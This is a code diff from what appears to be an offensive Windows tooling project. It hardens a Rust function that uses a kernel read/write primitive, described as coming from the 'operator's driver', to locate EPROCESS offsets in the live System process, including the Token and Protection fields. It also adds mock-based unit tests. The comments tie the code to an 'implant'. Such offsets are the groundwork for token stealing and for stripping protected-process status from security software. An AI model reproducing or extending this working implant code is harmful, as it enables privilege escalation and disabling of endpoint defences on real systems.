@@ -847,100 +847,168 @@ const EPROCESS_SCAN_LIMIT: usize = 0x1000;
 /// and Token across ALL known Win10/11 x64 builds (DefenderDump verified).
 const PID_TO_TOKEN_DELTA: usize = 0x78;
 
+/// Canonical x64 kernel-mode VA floor — every kernel mapping is at or above
+/// this (all known Windows 10/11 x64 kernels map ntoskrnl in the upper
+/// canonical half).
+const KERNEL_VA_MIN: u64 = 0xFFFF_8000_0000_0000;
+
+/// Is `v` a canonical kernel-mode pointer with a plausible `_EX_FAST_REF`
+/// shape? An `_EX_FAST_REF` packs a refcount in the low 4 bits of an object
+/// pointer; the pointer itself must be canonical and the refcount non-zero.
+fn is_fast_ref_kernel_ptr(v: u64) -> bool {
+    v != 0 && (v & 0xF) != 0 && (v & !0xF) >= KERNEL_VA_MIN
+}
+
+/// Is `v` a valid `SE_SIGNING_LEVEL`? The enum spans Unchecked(0) through
+/// SecureKernel(9); any other value means the byte is not a signature level.
+fn is_valid_signing_level(v: u8) -> bool {
+    v <= 9
+}
+
+/// Structural validation of an `ActiveProcessLinks` LIST_ENTRY at `links_kva`:
+/// both Flink and Blink must be canonical kernel VAs, AND the doubly-linked
+/// round-trip must hold — the next entry's Blink (flink+8) and the previous
+/// entry's Flink (blink) must BOTH point back to `links_kva`. A bare
+/// "looks like a kernel pointer" check is a single-field heuristic and is
+/// explicitly NOT accepted.
+fn links_roundtrip_valid(krw: &dyn KernelRw, links_kva: usize) -> Result<bool, KrwError> {
+    let flink = krw.kread_u64(links_kva)?;
+    let blink = krw.kread_u64(links_kva + 8)?;
+    if flink == 0 || blink == 0 || flink < KERNEL_VA_MIN || blink < KERNEL_VA_MIN {
+        return Ok(false);
+    }
+    let links_kva_u64 = links_kva as u64;
+    // Next entry's Blink must point back here, and so must prev entry's Flink.
+    if krw.kread_u64(flink as usize + 8)? != links_kva_u64 {
+        return Ok(false);
+    }
+    if krw.kread_u64(blink as usize)? != links_kva_u64 {
+        return Ok(false);
+    }
+    Ok(true)
+}
+
 /// DefenderDump-style dynamic EPROCESS offset probe.
 ///
 /// Given a working `KernelRw` and the System EPROCESS base KVA (PID 4),
 /// discovers all field offsets by scanning the structure invariants:
 ///
-/// 1. **PID offset**: scan for a qword == 4 (System PID)
+/// 1. **PID offset**: scan for a qword == 4 (System PID) — but ONLY accepted
+///    when the trailing structure validates: ActiveProcessLinks at +8 is a
+///    canonical doubly-linked LIST_ENTRY with a back-pointing round-trip, AND
+///    the Token at +0x78 is a canonical `_EX_FAST_REF`. A bare qword==4
+///    elsewhere is a single-field false positive and is REJECTED.
 /// 2. **Links offset**: PID + 8 (ActiveProcessLinks is the LIST_ENTRY
 ///    immediately after UniqueProcessId in all known builds)
-/// 3. **Token offset**: PID + 0x78 (constant delta, verified 17763–26200)
-/// 4. **ImageFileName offset**: scan for ASCII "System\0" after Links
+/// 3. **Token offset**: PID + 0x78 (constant delta, verified 17763–26200),
+///    validated as a canonical fast-ref pointer
+/// 4. **ImageFileName offset**: scan for ASCII "System\0" + zero pad byte
+///    (CHAR[15], zero-padded) after Links
 /// 5. **Protection offset**: scan for byte 0x72 (WinSystem:PP) after
-///    ImageFileName — System's protection level
+///    ImageFileName within the table-verified window, AND require the two
+///    adjacent bytes before it (SignatureLevel/SectionSignatureLevel) to be
+///    equal, valid SE_SIGNING_LEVEL values
 /// 6. **SignatureLevel**: Protection - 2 (three adjacent bytes:
 ///    SigLevel, SectionSigLevel, Protection — verified all builds)
 ///
-/// Returns `KrwError::UnresolvedOffset` if any step fails (unknown layout,
-/// corrupted structure, or non-standard build).
+/// Returns `KrwError::UnsupportedPosture` when a structural invariant fails
+/// (unknown layout, corrupted structure, or non-standard build) — never a
+/// partially-validated guess.
 pub fn probe_eprocess_offsets(
     krw: &dyn KernelRw,
     system_eprocess_kva: usize,
 ) -> Result<EprocessOffsets, KrwError> {
-    // Safety: scan within EPROCESS bounds.
-    let _scan_limit = system_eprocess_kva + EPROCESS_SCAN_LIMIT;
-
-    // Step 1: Find PID offset — scan for qword == 4 (System PID).
+    // Steps 1–3 are ONE structural candidate test, not three independent
+    // single-field scans: a PID slot is accepted only when the qword is 4 AND
+    // the Links at +8 form a canonical round-tripping LIST_ENTRY AND the Token
+    // at +0x78 is a canonical _EX_FAST_REF. This is what makes a random
+    // qword==4 elsewhere (e.g. in a structure field that happens to hold 4)
+    // fail the probe instead of producing garbage offsets.
     let mut pid_offset = None;
     for off in (0..0x600).step_by(8) {
-        let val = krw.kread_u64(system_eprocess_kva + off)?;
-        if val == 4 {
-            pid_offset = Some(off);
-            break;
+        if krw.kread_u64(system_eprocess_kva + off)? != 4 {
+            continue;
         }
+        let links_kva = system_eprocess_kva + off + 8;
+        let token_kva = system_eprocess_kva + off + PID_TO_TOKEN_DELTA;
+        // Token must stay inside the EPROCESS scan bound.
+        if off + PID_TO_TOKEN_DELTA + 8 > EPROCESS_SCAN_LIMIT {
+            continue;
+        }
+        if !links_roundtrip_valid(krw, links_kva)? {
+            continue;
+        }
+        if !is_fast_ref_kernel_ptr(krw.kread_u64(token_kva)?) {
+            continue;
+        }
+        pid_offset = Some(off);
+        break;
     }
-    let pid_offset = pid_offset.ok_or(KrwError::UnresolvedOffset(
-        "PID scan: System PID=4 not found",
+    let pid_offset = pid_offset.ok_or(KrwError::UnsupportedPosture(
+        "EPROCESS probe: no PID slot with structurally-valid Links round-trip + fast-ref Token \
+         (unknown or corrupt layout)",
     ))?;
 
-    // Step 2: Links offset = PID + 8 (LIST_ENTRY follows UniqueProcessId).
     let links_offset = pid_offset + 8;
-
-    // Verify Links: Flink should be a valid kernel pointer.
-    let flink = krw.kread_u64(system_eprocess_kva + links_offset)?;
-    if flink < 0xFFFF_8000_0000_0000 {
-        return Err(KrwError::UnresolvedOffset(
-            "Links scan: Flink not a kernel VA",
-        ));
-    }
-
-    // Step 3: Token offset = PID + 0x78 (constant delta).
     let token_offset = pid_offset + PID_TO_TOKEN_DELTA;
-    if token_offset + 8 > EPROCESS_SCAN_LIMIT {
-        return Err(KrwError::UnresolvedOffset(
-            "Token offset exceeds EPROCESS size",
-        ));
-    }
 
-    // Step 4: Scan for ImageFileName — ASCII "System\0" after Links.
-    let system_name = *b"System\0";
+    // Step 4: Scan for ImageFileName — ASCII "System\0" with the following
+    // byte zero (the CHAR[15] field is NUL-padded after the 7-byte name).
     let mut image_name_offset = None;
     for off in links_offset + 16..0x600 {
         let mut buf = [0u8; 8];
         krw.kread(system_eprocess_kva + off, &mut buf)?;
-        if buf[..7] == system_name[..7] {
+        if &buf[..7] == b"System\0" && buf[7] == 0 {
             image_name_offset = Some(off);
             break;
         }
     }
-    let image_name_offset = image_name_offset.ok_or(KrwError::UnresolvedOffset(
-        "ImageFileName scan: 'System' not found",
+    let image_name_offset = image_name_offset.ok_or(KrwError::UnsupportedPosture(
+        "EPROCESS probe: ImageFileName 'System' not found after Links",
     ))?;
 
-    // Step 5: Scan for Protection byte == 0x72 (WinSystem:PP = Type:2 | Signer:7<<4).
-    // Protection is a single byte, located after ImageFileName in all known builds.
+    // Step 5: Scan for Protection byte == 0x72 (WinSystem:PP = Type:2 |
+    // Signer:7<<4). Two structural guards against false positives:
+    //   a) bounded window after ImageFileName — protection − image_file_name
+    //      is 0x272..0x27A across EVERY row in KNOWN_EPROCESS_BUILDS;
+    //   b) the two ADJACENT preceding bytes (SignatureLevel / Section-
+    //      SignatureLevel) must be equal, valid SE_SIGNING_LEVEL values.
+    let protection_lo = image_name_offset + 0x100;
+    let protection_hi = image_name_offset + 0x400;
     let mut protection_offset = None;
-    for off in image_name_offset + 16..0xA00 {
+    for off in protection_lo..protection_hi {
         // Read one byte at a time to avoid IOCTL storms and page-boundary
         // faults (kread_u64 issues 8 individual IOCTL calls per step).
         let mut byte_buf = [0u8; 1];
         krw.kread(system_eprocess_kva + off, &mut byte_buf)
-            .map_err(|_| KrwError::UnresolvedOffset("Protection scan: kread failed"))?;
-        if byte_buf[0] == 0x72 {
-            protection_offset = Some(off);
-            break;
+            .map_err(|_| KrwError::UnsupportedPosture("Protection scan: kread failed"))?;
+        if byte_buf[0] != 0x72 {
+            continue;
         }
+        if off < 2 {
+            continue;
+        }
+        let mut levels = [0u8; 2];
+        krw.kread(system_eprocess_kva + off - 2, &mut levels)
+            .map_err(|_| KrwError::UnsupportedPosture("Protection scan: kread failed"))?;
+        if !is_valid_signing_level(levels[0])
+            || !is_valid_signing_level(levels[1])
+            || levels[0] != levels[1]
+        {
+            continue;
+        }
+        protection_offset = Some(off);
+        break;
     }
-    let protection_offset = protection_offset.ok_or(KrwError::UnresolvedOffset(
-        "Protection scan: 0x72 (WinSystem:PP) not found",
+    let protection_offset = protection_offset.ok_or(KrwError::UnsupportedPosture(
+        "EPROCESS probe: Protection 0x72 without valid adjacent signing levels",
     ))?;
 
     // Step 6: SigLevel = Protection - 2, SectionSigLevel = Protection - 1.
     // Verified: these three bytes are always adjacent in all known builds.
     let sig_level = protection_offset
         .checked_sub(2)
-        .ok_or(KrwError::UnresolvedOffset("SigLevel: offset underflow"))?;
+        .ok_or(KrwError::UnsupportedPosture("SigLevel: offset underflow"))?;
     let section_sig_level = protection_offset - 1;
 
     Ok(EprocessOffsets {
@@ -967,9 +1035,13 @@ pub fn probe_eprocess_offsets(
 ///    nothing on the target (offsets are compile-time constants).
 /// 2. **DefenderDump invariant probe (a handful of kernel reads)** —
 ///    [`probe_eprocess_offsets`] scans the live System EPROCESS for structural
-///    invariants (PID=4, "System" name, 0x72 protection byte). Works on ANY
-///    Windows x64 build, including future ones not in the table. This is the
-///    fallback for unknown builds.
+///    invariants only: PID=4 WITH a canonical doubly-linked ActiveProcessLinks
+///    round-trip AND a fast-ref Token, "System\0" image name, and 0x72
+///    protection backed by valid adjacent signing levels. There are NO bare
+///    single-field heuristics — a candidate that fails any structural check
+///    returns [`KrwError::UnsupportedPosture`] instead of a wrong offset.
+///    Works on ANY Windows x64 build, including future ones not in the table.
+///    This is the fallback for unknown builds.
 ///
 /// Call this instead of `for_build` directly when you have a `KernelRw`
 /// primitive (i.e. the operator's driver is loaded). The implant-side
@@ -1038,16 +1110,22 @@ mod probe_tests {
     fn build_mock_system_eprocess(krw: &MockKrw, base: usize, offsets: &EprocessOffsets) {
         // PID = 4 (System)
         krw.set_u64(base + offsets.unique_process_id, 4);
-        // ActiveProcessLinks: Flink = kernel VA, Blink = kernel VA
-        krw.set_u64(base + offsets.active_process_links, 0xFFFF_8000_0000_1000);
-        krw.set_u64(
-            base + offsets.active_process_links + 8,
-            0xFFFF_8000_0000_2000,
-        );
-        // Token (any value — probe doesn't validate token content)
+        // ActiveProcessLinks: Flink/Blink are canonical kernel VAs with a
+        // VALID doubly-linked round-trip — the next entry's Blink (flink+8)
+        // and the previous entry's Flink (blink) both point back to this
+        // EPROCESS's ActiveProcessLinks. The probe now REQUIRES this
+        // structure (a bare "kernel VA" Flink is rejected).
+        let links_kva = base + offsets.active_process_links;
+        let flink = 0xFFFF_8000_0000_1000usize;
+        let blink = 0xFFFF_8000_0000_2000usize;
+        krw.set_u64(base + offsets.active_process_links, flink as u64);
+        krw.set_u64(base + offsets.active_process_links + 8, blink as u64);
+        krw.set_u64(flink + 8, links_kva as u64); // next entry's Blink → here
+        krw.set_u64(blink, links_kva as u64); // prev entry's Flink → here
+        // Token (any value — probe validates fast-ref shape)
         krw.set_u64(base + offsets.token, 0xFFFF_8000_0000_5000 | 0x7);
-        // ImageFileName = "System\0"
-        krw.set_bytes(base + offsets.image_file_name, b"System\0");
+        // ImageFileName = "System\0" (+ zero pad byte — CHAR[15] field)
+        krw.set_bytes(base + offsets.image_file_name, b"System\0\0");
         // Protection = 0x72 (WinSystem:PP)
         krw.set_bytes(base + offsets.protection, &[0x72]);
         // SignatureLevel + SectionSignatureLevel (adjacent bytes before Protection)
@@ -1097,6 +1175,94 @@ mod probe_tests {
         let krw = MockKrw::new();
         let base = 0xFFFF_8000_0010_0000usize;
         assert!(probe_eprocess_offsets(&krw, base).is_err());
+    }
+
+    /// A bare qword == 4 with NO trailing structure (no valid Links round-trip,
+    /// no fast-ref Token) must be rejected — the probe has no bare single-field
+    /// heuristics.
+    #[test]
+    fn probe_rejects_bare_pid_match_without_structure() {
+        let krw = MockKrw::new();
+        let base = 0xFFFF_8000_0010_0000usize;
+        let known = for_build(17763).unwrap().offsets;
+        // Plant qword==4 at the TRUE pid offset but nothing else (no links,
+        // no token). The old probe accepted this; the structural probe must not.
+        krw.set_u64(base + known.unique_process_id, 4);
+        assert!(matches!(
+            probe_eprocess_offsets(&krw, base),
+            Err(KrwError::UnsupportedPosture(_))
+        ));
+    }
+
+    /// Flink/Blink that are kernel VAs but break the doubly-linked round-trip
+    /// must fail structural validation (a single-field "looks canonical" check
+    /// is not enough).
+    #[test]
+    fn probe_rejects_broken_links_roundtrip() {
+        let krw = MockKrw::new();
+        let base = 0xFFFF_8000_0010_0000usize;
+        let known = for_build(17763).unwrap().offsets;
+        build_mock_system_eprocess(&krw, base, &known);
+        // Break the round-trip: the Flink target's Blink no longer points back.
+        krw.set_u64(0xFFFF_8000_0000_1008, 0xFFFF_8000_0000_9999);
+        assert!(matches!(
+            probe_eprocess_offsets(&krw, base),
+            Err(KrwError::UnsupportedPosture(_))
+        ));
+    }
+
+    /// A Token slot that is not a canonical `_EX_FAST_REF` must reject the
+    /// candidate PID (the token-adjacency structural check).
+    #[test]
+    fn probe_rejects_non_canonical_token() {
+        let krw = MockKrw::new();
+        let base = 0xFFFF_8000_0010_0000usize;
+        let known = for_build(17763).unwrap().offsets;
+        build_mock_system_eprocess(&krw, base, &known);
+        // Non-canonical, non-fast-ref qword at the token slot.
+        krw.set_u64(base + known.token, 0x4141_4141_4141_4141);
+        assert!(matches!(
+            probe_eprocess_offsets(&krw, base),
+            Err(KrwError::UnsupportedPosture(_))
+        ));
+    }
+
+    /// Protection 0x72 must be backed by equal, valid SE_SIGNING_LEVEL bytes in
+    /// the two adjacent preceding slots — invalid levels reject the candidate.
+    #[test]
+    fn probe_rejects_invalid_signature_levels() {
+        let krw = MockKrw::new();
+        let base = 0xFFFF_8000_0010_0000usize;
+        let known = for_build(17763).unwrap().offsets;
+        build_mock_system_eprocess(&krw, base, &known);
+        // Protection stays 0x72, but the preceding levels are invalid.
+        krw.set_bytes(base + known.signature_level, &[0xFF]);
+        krw.set_bytes(base + known.section_signature_level, &[0x00]);
+        assert!(matches!(
+            probe_eprocess_offsets(&krw, base),
+            Err(KrwError::UnsupportedPosture(_))
+        ));
+    }
+
+    /// A lone 0x72 protection byte OUTSIDE the table-verified window after
+    /// ImageFileName must not be accepted (bounded-window structural guard).
+    #[test]
+    fn probe_rejects_protection_outside_verified_window() {
+        let krw = MockKrw::new();
+        let base = 0xFFFF_8000_0010_0000usize;
+        let known = for_build(17763).unwrap().offsets;
+        build_mock_system_eprocess(&krw, base, &known);
+        // Move Protection far beyond the verified image_name delta (0x272..0x27A)
+        // and clear the REAL Protection byte so only the out-of-window 0x72
+        // remains: the probe must reject rather than accept an out-of-window hit.
+        let bogus = known.image_file_name + 0x800;
+        krw.set_bytes(base + bogus, &[0x72]);
+        krw.set_bytes(base + bogus - 2, &[0x06, 0x06]);
+        krw.set_bytes(base + known.protection, &[0x00]);
+        assert!(matches!(
+            probe_eprocess_offsets(&krw, base),
+            Err(KrwError::UnsupportedPosture(_))
+        ));
     }
 
     /// Cross-validates the probe against every build in KNOWN_EPROCESS_BUILDS.
